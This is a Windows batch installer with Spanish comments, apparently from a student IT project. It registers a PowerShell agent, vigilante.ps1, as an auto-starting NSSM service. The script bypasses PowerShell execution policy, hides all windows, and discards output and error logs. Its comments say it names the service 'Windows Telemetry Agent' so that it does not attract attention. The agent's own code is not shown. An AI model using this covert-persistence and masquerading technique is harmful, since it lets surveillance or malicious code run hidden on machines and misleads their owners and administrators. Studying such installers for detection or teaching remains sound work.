@echo off
:: ======================================================================
:: INSTALADOR DEL AGENTE VIGILANTE - PROYECTO ASIR
:: ======================================================================
:: Este script instala vigilante.ps1 como un servicio de Windows invisible
:: usando NSSM. Debe ejecutarse con permisos de Administrador.
:: ======================================================================


:: ----------------------------------------------------------------------
:: COMPROBACION DE PERMISOS DE ADMINISTRADOR
:: ----------------------------------------------------------------------
:: "net session" falla si no hay privilegios de admin.
:: Si falla (errorLevel distinto de 0), avisamos y salimos.
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Ejecuta este archivo como Administrador.
    echo Clic derecho sobre instalar.bat ^> "Ejecutar como administrador"
    pause & exit /b 1
)


:: ----------------------------------------------------------------------
:: VARIABLES DE CONFIGURACION
:: ----------------------------------------------------------------------
:: DEST  = carpeta donde se instalaran los archivos del agente
:: SVC   = nombre interno del servicio en Windows (sin espacios)
set DEST=C:\Program Files\Vigilante
set SVC=VigilanteASIR


:: ----------------------------------------------------------------------
:: CREAR DIRECTORIO DE INSTALACION
:: ----------------------------------------------------------------------
:: Crea la carpeta destino si no existe.
:: El "2>nul" suprime el error si ya existia.
mkdir "%DEST%" 2>nul


:: ----------------------------------------------------------------------
:: COPIAR EL SCRIPT AL DIRECTORIO DE INSTALACION
:: ----------------------------------------------------------------------
:: Copiamos vigilante.ps1 desde la carpeta donde esta este .bat
:: hacia el directorio de instalacion definitivo.
:: %~dp0 = ruta de la carpeta donde esta este .bat
copy /Y "%~dp0vigilante.ps1" "%DEST%\vigilante.ps1"


:: ----------------------------------------------------------------------
:: REGISTRAR EL SERVICIO CON NSSM
:: ----------------------------------------------------------------------
:: NSSM envuelve PowerShell como si fuera un servicio nativo de Windows.
:: Parametros de PowerShell:
::   -ExecutionPolicy Bypass   -> permite ejecutar el .ps1 sin restricciones
::   -WindowStyle Hidden       -> no abre ninguna ventana visible
::   -NonInteractive           -> no espera input del usuario
::   -File                     -> ruta del script a ejecutar
nssm install %SVC% "powershell.exe" "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File ""%DEST%\vigilante.ps1"""


:: ----------------------------------------------------------------------
:: CONFIGURAR PROPIEDADES DEL SERVICIO
:: ----------------------------------------------------------------------

:: Nombre visible en el Administrador de servicios (services.msc)
:: Ponemos un nombre generico para no llamar la atencion
nssm set %SVC% DisplayName "Windows Telemetry Agent"

:: Descripcion visible en el Administrador de servicios
nssm set %SVC% Description "System diagnostics and telemetry service."

:: Tipo de inicio: automatico al arrancar Windows
nssm set %SVC% Start SERVICE_AUTO_START

:: Suprimir la consola de PowerShell (sin ventana negra)
nssm set %SVC% AppNoConsole 1

:: Redirigir la salida estandar a NULL (sin archivos de log visibles)
nssm set %SVC% AppStdout NULL

:: Redirigir los errores a NULL (sin archivos de log de errores visibles)
nssm set %SVC% AppStderr NULL


:: ----------------------------------------------------------------------
:: ARRANCAR EL SERVICIO
:: ----------------------------------------------------------------------
:: Inicia el servicio inmediatamente sin esperar al proximo reinicio.
net start %SVC%


:: ----------------------------------------------------------------------
:: CONFIRMACION FINAL
:: ----------------------------------------------------------------------
echo.
echo =====================================================
echo  Instalacion completada correctamente.
echo  El agente esta corriendo como servicio de Windows.
echo  Puedes verificarlo en: services.msc
echo  Busca el servicio: "Windows Telemetry Agent"
echo =====================================================
pause
